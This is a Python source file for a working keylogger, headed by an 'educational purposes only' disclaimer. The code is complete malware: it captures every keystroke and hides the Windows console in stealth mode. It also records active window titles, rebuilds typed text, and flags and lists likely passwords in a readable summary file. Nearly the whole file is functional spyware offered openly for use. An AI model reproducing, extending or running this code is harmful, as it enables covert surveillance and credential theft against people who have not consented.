"""
EDUCATIONAL KEYLOGGER PROJECT
==============================
WARNING: This software is for EDUCATIONAL PURPOSES ONLY.
Unauthorized use of keyloggers is ILLEGAL and unethical.
Only use this software on systems you own or have explicit permission to monitor.
The author is not responsible for any misuse of this software.
==============================
"""

from pynput import keyboard
from datetime import datetime
import os
import platform
import re
import argparse


class KeyLogger:
    """
    A keylogger class that captures and processes keyboard input intelligently.
    """

    def __init__(self, log_dir="logs", max_file_size_kb=100, stealth_mode=False):
        self.log_buffer = []
        self.current_modifiers = set()
        self.start_time = datetime.now()
        self.log_dir = log_dir
        self.max_file_size_bytes = max_file_size_kb * 1024
        self.current_log_file = None
        self.session_id = self.start_time.strftime("%Y%m%d_%H%M%S")
        self.stealth_mode = stealth_mode
        self.should_stop = False  # Flag to stop the listener

        # Stealth mode: secret key combination to stop (Ctrl+Shift+Esc)
        self.secret_stop_combination = {keyboard.Key.ctrl, keyboard.Key.shift, keyboard.Key.esc}
        self.currently_pressed = set()

        # Enhanced tracking
        self.current_window = ""
        self.current_text_buffer = ""
        self.window_change_count = 0
        self.last_window_check = datetime.now()
        self.sentences = []
        self.potential_passwords = []

        # Create logs directory if it doesn't exist
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)

        # Initialize log files
        self._create_new_log_file()
        self._write_session_header()

        # Create readable summary file
        self.summary_file = os.path.join(self.log_dir, f"summary_session_{self.session_id}.txt")
        self._init_summary_file()

        # Hide console if in stealth mode
        if self.stealth_mode:
            self._hide_console()

    def _hide_console(self):
        """Hide the console window (Windows only)."""
        try:
            if platform.system() == "Windows":
                import ctypes
                # Get console window handle
                console_window = ctypes.windll.kernel32.GetConsoleWindow()
                if console_window:
                    # SW_HIDE = 0
                    ctypes.windll.user32.ShowWindow(console_window, 0)
        except Exception:
            pass

    def _log_stealth_message(self, message):
        """Log message only to file in stealth mode, or to console in normal mode."""
        if self.stealth_mode:
            # In stealth mode, don't write anything (already written by _write_to_file)
            pass
        else:
            # In normal mode, print to console
            print(message, end='', flush=True)

    def _init_summary_file(self):
        """Initialize the human-readable summary file."""
        header = f"""
{'='*80}
KEYLOGGER SESSION SUMMARY - HUMAN READABLE FORMAT
{'='*80}
Session ID: {self.session_id}
Start Time: {self.start_time.strftime("%Y-%m-%d %H:%M:%S")}
System: {platform.system()} {platform.release()}
{'='*80}

This file contains a reconstructed view of user activity for easy analysis.

"""
        try:
            with open(self.summary_file, 'w', encoding='utf-8') as f:
                f.write(header)
        except Exception:
            pass

    def _write_to_summary(self, content):
        """Write to the human-readable summary file."""
        try:
            with open(self.summary_file, 'a', encoding='utf-8') as f:
                f.write(content)
        except Exception:
            pass

    def _check_window_change(self):
        """Check if the active window has changed and log it."""
        current_time = datetime.now()
        # Check window every 0.5 seconds to avoid performance issues
        if (current_time - self.last_window_check).total_seconds() > 0.5:
            new_window = self._get_active_window_title()
            if new_window != self.current_window and new_window != "Unknown":
                self.last_window_check = current_time

                # Save previous text buffer if it exists
                if self.current_text_buffer.strip():
                    self._save_text_entry()

                self.current_window = new_window
                self.window_change_count += 1

                timestamp = self.get_timestamp()
                window_log = f"\n{'='*80}\n[{timestamp}] WINDOW CHANGED: {new_window}\n{'='*80}\n"

                self._write_to_file(window_log)
                self._write_to_summary(window_log)

                if not self.stealth_mode:
                    print(f"\n\n[WINDOW: {new_window}]\n", end='', flush=True)

    def _save_text_entry(self):
        """Save the current text buffer as a complete entry."""
        if not self.current_text_buffer.strip():
            return

        timestamp = self.get_timestamp()

        # Detect potential password (text with no spaces and special chars)
        is_potential_password = self._is_potential_password(self.current_text_buffer)

        if is_potential_password:
            entry = f"\n[{timestamp}] [POTENTIAL PASSWORD] >>> {self.current_text_buffer} <<<\n"
            self.potential_passwords.append({
                'time': timestamp,
                'window': self.current_window,
                'text': self.current_text_buffer
            })
        else:
            entry = f"\n[{timestamp}] TEXT TYPED: {self.current_text_buffer}\n"
            self.sentences.append({
                'time': timestamp,
                'window': self.current_window,
                'text': self.current_text_buffer
            })

        self._write_to_summary(entry)
        self.current_text_buffer = ""

    def _is_potential_password(self, text):
        """Detect if text might be a password."""
        if len(text) < 4:
            return False

        # Passwords often have:
        # - No spaces
        # - Mix of letters and numbers
        # - Special characters
        has_no_spaces = ' ' not in text
        has_numbers = bool(re.search(r'\d', text))
        has_special = bool(re.search(r'[!@#$%^&*()_+\-=\[\]{};:\'",.<>?/\\|`~]', text))
        has_mixed_case = text != text.lower() and text != text.upper()

        # If it has at least 2 of these characteristics, might be a password
        indicators = sum([has_numbers, has_special, has_mixed_case])

        return has_no_spaces and indicators >= 2

    def _create_new_log_file(self):
        """Create a new log file with timestamp."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"keylog_session_{self.session_id}_part_{timestamp}.txt"
        self.current_log_file = os.path.join(self.log_dir, filename)

    def _check_file_rotation(self):
        """Check if current log file exceeds size limit and rotate if needed."""
        if os.path.exists(self.current_log_file):
            file_size = os.path.getsize(self.current_log_file)
            if file_size >= self.max_file_size_bytes:
                self._write_to_file("\n" + "="*60 + "\n")
                self._write_to_file("[FILE ROTATION - SIZE LIMIT REACHED]\n")
                self._write_to_file("="*60 + "\n\n")
                self._create_new_log_file()
                self._write_session_header()

    def _write_session_header(self):
        """Write session information header to log file."""
        header = f"""
{'='*60}
KEYLOGGER SESSION LOG
{'='*60}
Session ID: {self.session_id}
Start Time: {self.start_time.strftime("%Y-%m-%d %H:%M:%S")}
System: {platform.system()} {platform.release()}
Machine: {platform.machine()}
Python Version: {platform.python_version()}
{'='*60}

"""
        self._write_to_file(header)

    def _write_to_file(self, content):
        """Write content to the current log file."""
        try:
            with open(self.current_log_file, 'a', encoding='utf-8') as f:
                f.write(content)
        except Exception as e:
            pass

    def _get_active_window_title(self):
        """Get the title of the currently active window (Windows only)."""
        try:
            if platform.system() == "Windows":
                import ctypes
                import ctypes.wintypes

                # Get foreground window
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                return buff.value if buff.value else "Unknown"
            else:
                return "N/A (Non-Windows System)"
        except Exception:
            return "Unknown"

    def get_timestamp(self):
        """Generate a formatted timestamp for each event."""
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def process_special_key(self, key):
        """
        Process special keys and return a readable format.
        """
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
            keyboard.Key.home: "[HOME]",
            keyboard.Key.end: "[END]",
            keyboard.Key.page_up: "[PAGE_UP]",
            keyboard.Key.page_down: "[PAGE_DOWN]",
            keyboard.Key.caps_lock: "[CAPS_LOCK]",
            keyboard.Key.num_lock: "[NUM_LOCK]",
            keyboard.Key.scroll_lock: "[SCROLL_LOCK]",
            keyboard.Key.insert: "[INSERT]",
            keyboard.Key.pause: "[PAUSE]",
            keyboard.Key.print_screen: "[PRINT_SCREEN]",
        }

        return special_keys.get(key, f"[{str(key).replace('Key.', '').upper()}]")

    def on_press(self, key):
        """
        Callback function when a key is pressed.
        Handles regular keys, special keys, and modifiers.
        """
        try:
            timestamp = self.get_timestamp()

            # Track pressed keys for secret combination FIRST
            self.currently_pressed.add(key)

            # Check for secret stop combination in stealth mode BEFORE processing modifiers
            if self.stealth_mode:
                # Check if we have Ctrl, Shift, and Esc all pressed
                has_ctrl = any(k in self.currently_pressed for k in [keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l])
                has_shift = any(k in self.currently_pressed for k in [keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l])
                has_esc = keyboard.Key.esc in self.currently_pressed

                if has_ctrl and has_shift and has_esc:
                    self._write_to_file(f"\n\n[{timestamp}] [SECRET STOP COMBINATION DETECTED - KEYLOGGER STOPPED]\n")
                    self._write_session_footer()
                    return False

            # Check for window changes
            self._check_window_change()

            # Track and log modifier keys
            if key in [keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l]:
                if "SHIFT" not in self.current_modifiers:
                    self.current_modifiers.add("SHIFT")
                    log_entry = f"[{timestamp}] [SHIFT]"
                    self.log_buffer.append(log_entry)
                    self._write_to_file(log_entry)
                    self._log_stealth_message(log_entry)
                return
            elif key in [keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l]:
                if "CTRL" not in self.current_modifiers:
                    self.current_modifiers.add("CTRL")
                    log_entry = f"[{timestamp}] [CTRL]"
                    self.log_buffer.append(log_entry)
                    self._write_to_file(log_entry)
                    self._log_stealth_message(log_entry)
                return
            elif key in [keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.alt_l]:
                if "ALT" not in self.current_modifiers:
                    self.current_modifiers.add("ALT")
                    log_entry = f"[{timestamp}] [ALT]"
                    self.log_buffer.append(log_entry)
                    self._write_to_file(log_entry)
                    self._log_stealth_message(log_entry)
                return
            elif key == keyboard.Key.cmd or key == keyboard.Key.cmd_r:
                if "WIN" not in self.current_modifiers:
                    self.current_modifiers.add("WIN")
                    log_entry = f"[{timestamp}] [WIN]"
                    self.log_buffer.append(log_entry)
                    self._write_to_file(log_entry)
                    self._log_stealth_message(log_entry)
                return

            # Process regular character keys
            if hasattr(key, 'char') and key.char is not None:
                char = key.char

                # Add modifier prefix if any modifiers are active
                if self.current_modifiers:
                    modifier_str = "+".join(sorted(self.current_modifiers))
                    log_entry = f"[{timestamp}] [{modifier_str}+{char}]"
                    display_entry = log_entry
                else:
                    log_entry = char
                    display_entry = char
                    # Add to text buffer for reconstruction
                    self.current_text_buffer += char

                self.log_buffer.append(log_entry)
                self._write_to_file(log_entry)
                self._log_stealth_message(display_entry)

            # Process special keys
            else:
                special_key_str = self.process_special_key(key)

                # Handle special keys that affect text buffer
                if key == keyboard.Key.space:
                    self.current_text_buffer += " "
                elif key == keyboard.Key.enter:
                    # Save the current text entry on Enter
                    self._save_text_entry()
                    special_key_str = "[ENTER]\n"
                elif key == keyboard.Key.backspace:
                    # Remove last character from buffer
                    if self.current_text_buffer:
                        self.current_text_buffer = self.current_text_buffer[:-1]
                elif key == keyboard.Key.tab:
                    # Tab often indicates moving to next field (potential password field)
                    if self.current_text_buffer.strip():
                        self._save_text_entry()

                if self.current_modifiers:
                    modifier_str = "+".join(sorted(self.current_modifiers))
                    log_entry = f"[{timestamp}] [{modifier_str}+{special_key_str}]"
                else:
                    log_entry = f"[{timestamp}] {special_key_str}"

                self.log_buffer.append(log_entry)
                self._write_to_file(log_entry)
                self._log_stealth_message(log_entry)

            # Check for file rotation
            self._check_file_rotation()

        except Exception as e:
            pass

    def on_release(self, key):
        """
        Callback function when a key is released.
        Tracks when modifier keys are released.
        """
        # Remove from currently pressed set
        self.currently_pressed.discard(key)

        # Remove modifier from active set when released
        if key in [keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l]:
            self.current_modifiers.discard("SHIFT")
        elif key in [keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l]:
            self.current_modifiers.discard("CTRL")
        elif key in [keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.alt_l]:
            self.current_modifiers.discard("ALT")
        elif key == keyboard.Key.cmd or key == keyboard.Key.cmd_r:
            self.current_modifiers.discard("WIN")

        # Stop listener with ESC key (only in normal mode)
        if key == keyboard.Key.esc and not self.stealth_mode:
            self._write_session_footer()
            print("\n\n[KEYLOGGER STOPPED]")
            return False

    def _write_session_footer(self):
        """Write session end information to log file."""
        end_time = datetime.now()
        duration = end_time - self.start_time

        # Save any remaining text
        if self.current_text_buffer.strip():
            self._save_text_entry()

        footer = f"""

{'='*60}
SESSION END
{'='*60}
End Time: {end_time.strftime("%Y-%m-%d %H:%M:%S")}
Duration: {duration}
Total Keys Captured: {len(self.log_buffer)}
Windows Visited: {self.window_change_count}
Text Entries Captured: {len(self.sentences)}
Potential Passwords Detected: {len(self.potential_passwords)}
{'='*60}
"""
        self._write_to_file(footer)
        self._write_session_summary()

    def _write_session_summary(self):
        """Write a complete session summary with statistics."""
        end_time = datetime.now()
        duration = end_time - self.start_time

        summary = f"""

{'='*80}
FINAL SESSION STATISTICS
{'='*80}
Total Duration: {duration}
Total Keys Pressed: {len(self.log_buffer)}
Different Windows Used: {self.window_change_count}
Text Entries Captured: {len(self.sentences)}
Potential Passwords Found: {len(self.potential_passwords)}
{'='*80}

"""
        self._write_to_summary(summary)

        # List all potential passwords found
        if self.potential_passwords:
            summary += "\n⚠️  POTENTIAL PASSWORDS DETECTED:\n"
            summary += "="*80 + "\n"
            for i, pwd in enumerate(self.potential_passwords, 1):
                summary += f"\n{i}. Time: {pwd['time']}\n"
                summary += f"   Window: {pwd['window']}\n"
                summary += f"   Text: {pwd['text']}\n"
            summary += "\n" + "="*80 + "\n"
            self._write_to_summary(summary)

        # List all text entries
        if self.sentences:
            summary = f"\n📝 ALL TEXT ENTRIES:\n{'='*80}\n"
            for i, entry in enumerate(self.sentences, 1):
                summary += f"\n{i}. [{entry['time']}] [{entry['window']}]\n"
                summary += f"   {entry['text']}\n"
            summary += "\n" + "="*80 + "\n"
            self._write_to_summary(summary)

    def start(self):
        """
        Start the keylogger listener.
        """
        if self.stealth_mode:
            # Stealth mode: minimal output, hidden console
            self._write_to_file(f"\n[STEALTH MODE ACTIVATED]\n")
            self._write_to_file(f"[Secret stop combination: Ctrl+Shift+Esc]\n")
            self._write_to_file(f"[Started at: {self.get_timestamp()}]\n\n")
        else:
            # Normal mode: full console output
            print("="*60)
            print("EDUCATIONAL KEYLOGGER - PHASE 3 (Stealth Capable)")
            print("="*60)
            print(f"Started at: {self.get_timestamp()}")
            print(f"Raw logs: {self.current_log_file}")
            print(f"Summary: {self.summary_file}")
            print("Press ESC to stop the keylogger")
            print("="*60)
            print("\nCapturing keystrokes:\n")

        # Start listening to keyboard events
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()

        if not self.stealth_mode:
            print(f"\n\nStopped at: {self.get_timestamp()}")
            print(f"Total keys captured: {len(self.log_buffer)}")
            print(f"Text entries: {len(self.sentences)}")
            print(f"Potential passwords: {len(self.potential_passwords)}")
            print(f"\nLogs saved to: {self.log_dir}/")
            print(f"📊 Check {self.summary_file} for readable summary!")


def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description='Educational Keylogger - For cybersecurity learning purposes only',
        epilog='WARNING: Unauthorized use is ILLEGAL and UNETHICAL'
    )

    parser.add_argument(
        '-s', '--stealth',
        action='store_true',
        help='Run in stealth mode (hidden console, secret stop combination: Ctrl+Shift+Esc)'
    )

    parser.add_argument(
        '-d', '--directory',
        type=str,
        default='logs',
        help='Directory for log files (default: logs)'
    )

    parser.add_argument(
        '-m', '--max-size',
        type=int,
        default=100,
        help='Maximum log file size in KB before rotation (default: 100)'
    )

    return parser.parse_args()


def main():
    """
    Main entry point for the keylogger.
    """
    # Parse command line arguments
    args = parse_arguments()

    if not args.stealth:
        print(__doc__)

    # Create and start the keylogger
    keylogger = KeyLogger(
        log_dir=args.directory,
        max_file_size_kb=args.max_size,
        stealth_mode=args.stealth
    )
    keylogger.start()


if __name__ == "__main__":
    main()
